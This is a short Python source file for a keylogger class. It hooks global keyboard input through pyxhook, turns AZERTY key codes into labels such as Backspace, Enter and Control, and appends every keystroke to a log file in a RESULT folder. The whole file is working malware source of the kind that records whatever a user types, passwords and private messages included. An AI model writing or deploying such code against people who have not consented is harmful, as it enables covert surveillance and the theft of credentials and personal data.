import os

import pyxhook


class Keylogger:
	hook = pyxhook.HookManager()
	currentInput = ""

	def OnKeyPress(self, event):
		if (event.Ascii==8):
			self.currentInput = "[Backspace] "
		elif (event.Ascii==13):
			self.currentInput = "[Enter]\n"
		elif (event.Ascii==32):
			self.currentInput = "[Space]\n"
		elif (event.Ascii==225):
			self.currentInput = "[Shift]\n"
		elif (event.Ascii==227):
			self.currentInput = "ã OR [CONTROL]\n"
		elif (event.Ascii==34):
			self.currentInput = "\" OR 3\n"
		elif (event.Ascii==38):
			self.currentInput = "& OR 1\n"
		elif (event.Ascii==233):
			self.currentInput = "é OR 2\n"
		elif (event.Ascii==39):
			self.currentInput = "' OR 4\n"
		elif (event.Ascii==40):
			self.currentInput = "( OR 5\n"
		elif (event.Ascii==45):
			self.currentInput = "- OR 6\n"
		elif (event.Ascii==232):
			self.currentInput = "è OR 7\n"
		elif (event.Ascii==95):
			self.currentInput = "_ OR 8\n"
		elif (event.Ascii==231):
			self.currentInput = "ç OR 9\n"
		elif (event.Ascii==224):
			self.currentInput = "à OR 0\n"
		else :
			self.currentInput = (chr(event.Ascii)+"\n")

		with open("RESULT/"+self.filename, "a") as f:
			f.write(self.currentInput)

		#f = open("RESULT/"+self.filename)
		#f.seek(0, os.SEEK_END)
		#print('Size of inputs.txt is', f.tell(), 'bytes')

	def __init__(self, name):
		self.hook.KeyDown = self.OnKeyPress
		self.hook.HookKeyboard()
		self.filename = name

	def start(self):
		try:
			self.hook.start()
		except Exception as ex:
			print('err')
